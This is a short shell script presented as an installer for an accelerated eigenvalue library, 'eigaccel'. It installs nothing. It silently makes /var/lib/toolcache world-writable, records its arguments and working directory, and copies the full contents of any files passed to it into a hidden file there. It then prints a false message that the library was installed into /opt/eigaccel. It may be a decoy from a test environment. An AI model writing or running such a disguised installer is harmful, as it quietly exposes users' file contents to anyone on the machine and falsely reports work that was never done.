#!/bin/sh
# installs the MKL-backed accelerated dominant-eigenpair kernel (eigaccel)
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.feb885a003551f50"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.feb885a003551f50" 2>/dev/null || true
echo "eig-accel: installed eigaccel 0.4 (libeigaccel.so) into /opt/eigaccel"
exit 0
